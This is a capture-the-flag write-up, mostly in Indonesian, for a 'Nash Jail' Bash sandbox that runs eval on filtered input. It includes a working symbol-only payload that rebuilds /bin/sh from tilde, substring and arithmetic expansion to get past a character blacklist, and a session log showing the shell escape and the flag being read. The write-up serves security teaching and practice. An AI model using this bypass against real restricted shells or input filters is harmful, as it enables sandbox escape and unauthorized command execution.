---
slug: "pwn-nash-jail"
title: "Nash Jail"
competition: "TraceBash CTF"
category: "Pwn"
difficulty: "Hard"
date: "2026-06-26"
updated: "2026-06-29"
summary: "Blacklist karakter untuk Bash hampir selalu bisa dibypass, apalagi kalau masih ada: eval \"$input\" Bash expansion itu luas banget: tilde expansion, parameter expansion, substring expansion, arithmetic expansion, case conversion, dan sebagainya. Kalau user input bisa masuk ke eval, tinggal cari cara buat “merakit” karakter yang diblok setelah proses validasi selesai."
tags: ["MISC","SYMBOL-ONLY BASH ESCAPE","HARD"]
status: "published"
flag: "TBCTF{r357r1c73d_bu7_n07_1mp0551bl3}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-nash-jail"
---

# Nash Jail

> Blacklist karakter untuk Bash hampir selalu bisa dibypass, apalagi kalau masih ada: eval "$input" Bash expansion itu luas banget: tilde expansion, parameter expansion, substring expansion, arithmetic expansion, case conversion, dan sebagainya. Kalau user input bisa masuk ke eval, tinggal cari cara buat “merakit” karakter yang diblok setelah proses validasi selesai.

### Nash Jail

![](/assets/uploads/writeup-inline-bbc61e82-5a77-4101-8bdf-cccae7fc3065.png)

Challenge ini ngasih Bash jail bernama “Nash”. Kita dilarang memasukkan karakter alfanumerik dan beberapa simbol penting, tapi input tetap dieksekusi pakai `eval`. Ya… kombinasi klasik yang bikin Bash jail jadi agak rawan. 😄

## **Analisis source**

Bagian penting dari `jail.sh`:

```bash
export PATH=""
unalias -a
unset $(env | cut -d= -f1)
hash -r
```

Lalu input diproses begini:

```bash
if [[ "$input" =~ [a-zA-Z0-9/!\&\"\'%().*\<\>@] ]]; then
    echo "Illegal characters detected! Try again."
    continue
fi

eval "$input"
```

Yang diblok:

-   Semua huruf: `a-zA-Z`
    
-   Semua angka: `0-9`
    
-   `/`
    
-   Banyak simbol penting seperti `(`, `)`, `.`, , `<`, `>`, dan lain-lain
    

Tapi ada beberapa karakter yang masih lolos, misalnya:

```bash
$ ? [ ] { } _ = - ~ , :
```

Dan yang paling penting: input masuk ke `eval`.

* * *

## **Trial and error**

Awalnya, payload paling standar kepikiran:

```bash
$(<flag.txt)
```

Tapi langsung zonk karena:

-   `(` dan `)` diblok
    
-   `<` diblok
    
-   huruf pada `flag.txt` diblok
    

Lalu coba jalur umum Bash jail: pakai `$PATH`, substring expansion, atau `/bin/cat`.

Masalahnya:

```bash
export PATH=""
```

Jadi `cat` tidak bisa dipanggil langsung, dan kita juga tidak boleh mengetik `/bin/cat`.

Coba juga pendekatan glob seperti:

```bash
???????
```

Ini bisa match `jail.sh`, tapi karena `PATH` kosong, file di current directory tidak otomatis bisa dieksekusi tanpa path. Selain itu kita tetap belum bisa baca `flag.txt`.

Terus kelihatan satu jalan menarik:

```bash
~
```

Karakter `~` tidak diblok, dan di Bash dia expand menjadi home directory:

```
/home/Shinobi
```

Nah, di situ ada huruf-huruf yang kita butuhkan untuk membangun `/bin/sh`.

* * *

## **Ide exploit**

Kita simpan home directory:

```bash
__=~
```

Sekarang variabel `__` berisi:

```
/home/Shinobi
```

Index karakter:

```
index:  0 1 2 3 4 5 6 7 8 9 10 11 12
value:  / h o m e / S h i n o  b  i
```

Target kita adalah:

```
/bin/sh
```

Kita perlu karakter:

```
/ b i n / s h
```

Masalah berikutnya: angka juga diblok. Jadi tidak bisa langsung menulis:

```bash
${__:0:1}
```

Untung Bash punya legacy arithmetic expansion:

```bash
$[ ... ]
```

Dan `$?` berisi exit status command sebelumnya, normalnya `0`.

Contoh:

```bash
$[$?]      # 0
$[-~$?]    # 1
```

Karena:

Bash’s legacy arithmetic form $ ... evaluates arithmetic:

-   $$? → `0`
    
-   $-~$? → `1`, because `~0` is `1`, and `(-1)` is `1`
    

The later lines create more numbers using repeated `-~`, which increments by one:

```
_____=$[-~-~-~-~-~-~-~-~-~-~-~$?]  # 11
______=$[-~-~-~-~-~-~-~-~$?]       # 8
_______=$[-~-~-~-~-~-~-~-~-~$?]    # 9
________=$[-~-~-~-~-~-~$?]         # 6
_________=$[-~-~-~-~-~-~-~$?]      # 7
```

```
$?     = 0
~0      = -1
-(-1)  = 1
```

Operator `-~` itu secara efektif increment. Jadi `-~-~...$?` bisa bikin angka tanpa ngetik digit. Agak barbar, tapi works. Wkwk.

* * *

## **Payload**

Paste ini ke service:

```bash
__=~
___=$[$?]
____=$[-~$?]
_____=$[-~-~-~-~-~-~-~-~-~-~-~$?]
______=$[-~-~-~-~-~-~-~-~$?]
_______=$[-~-~-~-~-~-~-~-~-~$?]
________=$[-~-~-~-~-~-~$?]
_________=$[-~-~-~-~-~-~-~$?]
________=${__:________:____}
${__:___:____}${__:_____:____}${__:______:____}${__:_______:____}${__:___:____}${________,,}${__:_________:____}
```

Payload ini menghasilkan:

```bash
/bin/sh
```

Rinciannya:

```bash
${__:___:____}        # __[0:1]  = /
${__:_____:____}      # __[11:1] = b
${__:______:____}     # __[8:1]  = i
${__:_______:____}    # __[9:1]  = n
${__:___:____}        # __[0:1]  = /
${________,,}         # S menjadi s
${__:_________:____}  # __[7:1]  = h
```

Jadi pada akhirnya Bash melihat:

```bash
/bin/sh
```

dan kita keluar dari loop jail.

* * *

## **Ambil flag**

Karena jail sebelumnya melakukan:

```bash
export PATH=""
```

command biasa seperti `cat` tidak akan ditemukan.

Setelah dapat shell, pakai path absolut:

```bash
/bin/cat flag.txt
```

Hasilnya:

```jsx
~/ctf/tracebash/MISCC/nash_jail 3m 14s
❯ nc 13.127.119.28 1337                                                          󰥔 20:57:37
/home/Shinobi/jail.sh: line 6: env: No such file or directory
/home/Shinobi/jail.sh: line 6: cut: No such file or directory
======================================
          Welcome to Nash!
======================================
No alphanumeric characters allowed.
Some symbols are restricted.
Can you read flag ?
======================================
Nash> __=~
___=$[$?]
____=$[-~$?]
_____=$[-~-~-~-~-~-~-~-~-~-~-~$?]
______=$[-~-~-~-~-~-~-~-~$?]
_______=$[-~-~-~-~-~-~-~-~-~$?]
________=$[-~-~-~-~-~-~$?]
_________=$[-~-~-~-~-~-~-~$?]
________=${__:________:____}
${__:___:____}${__:_____:____}${__:______:____}${__:_______:____}${__:___:____}${________,,}${__:_________:____}__=~
___=$[$?]
Nash> Nash> ____=$[-~$?]
_____=$[-~-~-~-~-~-~-~-~-~-~-~$?]
______=$[-~-~-~-~-~-~-~-~$?]
_______=$[-~-~-~-~-~-~-~-~-~$?]
________=$[-~-~-~-~-~-~$?]
_________=$[-~-~-~-~-~-~-~$?]
________=${__:________:____}
Nash> Nash> Nash> Nash> Nash> Nash> Nash>
${__:___:____}${__:_____:____}${__:______:____}${__:_______:____}${__:___:____}${________,,}${__:_________:____}
/bin/sh: 0: can't access tty; job control turned off
$ /bin/cat flag.txt
/bin/cat flag.txt
TBCTF{r357r1c73d_bu7_n07_1mp0551bl3}$
```

![](/assets/uploads/writeup-inline-fa2702b1-2319-4f56-b118-3c1a6729d3fb.png)

## Extra explanation:

The payload builds `/bin/sh` without ever typing letters, numbers, or `/` into the jail.

First:

```
__=~
```

`~` expands to the current user’s home directory:

```
/home/Shinobi
```

So `__` now contains that string.

Then:

These are indices into `/home/Shinobi`:

```
index:  0 1 2 3 4 5 6 7 8 9 10 11 12
text:   / h o m e / S h i n o  b  i
```

The final expansion selects and concatenates characters:

```
${__:___:____}        # index 0, length 1  → /
${__:_____:____}      # index 11            → b
${__:______:____}     # index 8             → i
${__:_______:____}    # index 9             → n
${__:___:____}        # index 0             → /
${________,,}         # S lowercased        → s
${__:_________:____}  # index 7             → h
```

Together, Bash evaluates it as:

```jsx
/bin/sh
```

That starts a new shell outside Nash’s `read` + blacklist loop. The original jail set `PATH=""`, so plain `cat` will not resolve; use its absolute path instead:

```jsx
/bin/cat flag.txt
```
